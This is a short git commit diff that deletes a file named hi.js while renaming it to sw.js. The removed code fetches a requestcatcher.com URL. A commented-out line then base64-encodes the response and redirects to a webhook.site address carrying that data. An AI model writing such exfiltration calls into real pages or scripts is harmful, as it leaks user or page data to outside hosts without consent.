82e06a171f85aef6e17d8aa7ae5ad8090af6f879
Rishabh <140229408+CoderZonora@users.noreply.github.com>
2025-04-12 18:17:10 +0530

    Update and rename hi.js to sw.js

--- hi.js
+++
@@ -1,4 +0,0 @@
-
-fetch(`https://noproblem.requestcatcher.com/`)
-  
-  //.then(response => response.text()).then(text => window.location.href =`https://webhook.site/76545f8b-3667-4b31-9346-0f05f721869f?cz=${btoa(text)}`);
